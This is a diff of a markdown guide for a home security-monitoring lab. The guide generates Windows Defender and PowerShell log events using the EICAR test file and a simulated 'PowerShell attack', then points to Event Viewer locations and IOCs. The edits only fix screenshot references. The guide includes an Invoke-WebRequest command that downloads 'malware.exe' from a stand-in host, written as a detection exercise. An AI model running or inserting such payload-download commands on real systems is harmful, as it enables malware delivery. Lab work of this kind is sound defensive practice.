@@ -8,10 +8,10 @@ See `Brute_Force_incident_report.md` for the full report. Additionally, to see h
 
 ### Steps
 + **Open Browser on the Windows VM**
-+ Visit the official EICAR test file site (Please see **Image 1** within Screenshot/Malware )
++ Visit the official EICAR test file site (Please see **Image 1** within Screenshots/Malware )
   🔗 [https://www.eicar.org/download-anti-malware-tesfile/](https://www.eicar.org/download-anti-malware-tesfile/)
-+ Download the `eicar.com` file - your antivirus or Windows Defender will likely alert or block it (Please see **Image 1**).
-  #### Alternative way to download if it is blocked (Manual Method) (Please see **Image 2**)
++ Download the `eicar.com` file - your antivirus or Windows Defender will likely alert or block it (Please see **Image 3** within Screenshots/Malware).
+  #### Alternative way to download if it is blocked (Manual Method) (Please see **Image 2** within Screenshots/Malware)
   +  Open Notepad (or any text editor)
   +  Paste this exact string on a single line:
   +  ```spl
@@ -23,7 +23,7 @@ See `Brute_Force_incident_report.md` for the full report. Additionally, to see h
     ```
   + Save it to your *Desktop or a dedicated test folder like `C:\EICAR_TEST`
   ✅ Done! You now have a test virus file.
-+ Attempt to run it on your desktop (it will likely get a block event) (Please see **Image 4**).
++ Attempt to run it on your desktop (it will likely get a block event) (Please see **Image 4** within Screenshots/Malware).
 + Open **Windows Event Viewer → Applications and Services Logs → Microsoft → Windows → Windows Defender → Operational**, look for logs from `Window Defender`
 ### Common IOCs that can be extracted from Windows Defender Malware Logs
 | IoC Type             | Description / Example           | 
@@ -53,13 +53,13 @@ See `Brute_Force_incident_report.md` for the full report. Additionally, to see h
 ## 🧨Powershell Attack
 ### Steps
 + **Open PowerShell as Administrator on the Windows VM**
-+ Run the following harmless but suspicious command:
++ Run the following harmless but suspicious command (Please see **Image 1 and 2** within Screenshots/Malware):
 
   ```spl
   
   Invoke-WebRequest -Uri "http://test.com/malware.exe" -OutFile "C:\Users\Public\Downloads\malware.exe"
   ```
-  + Check **Windows Event Viewer** under:
+  + Check **Windows Event Viewer** under (Please see **Image 3** within Screenshots/Malware):
     + ` Windows Event Viewer → Applications and Services Logs → Microsoft → Windows → Powershell → Operational`
     + Event ID: `4104` (script block logging)
 
